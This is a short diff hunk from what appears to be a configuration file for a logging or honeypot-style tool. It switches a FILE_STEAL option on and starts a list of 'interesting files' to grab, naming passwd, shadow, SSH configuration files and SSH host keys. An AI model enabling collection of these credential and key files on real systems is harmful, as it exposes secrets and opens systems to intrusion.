@@ -75,7 +75,7 @@ MAX_LOGS_SIZE   = (1024 * 1024) * 150  # don't store more than 150mb of logs per
 
 # START OF FILE STEALING STUFF.
 
-FILE_STEAL = False  # if False then nothing below will apply.
+FILE_STEAL = True  # if False then nothing below will apply.
 
 # you can also specify paths. wildcards apply..
 INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host_*_key*',
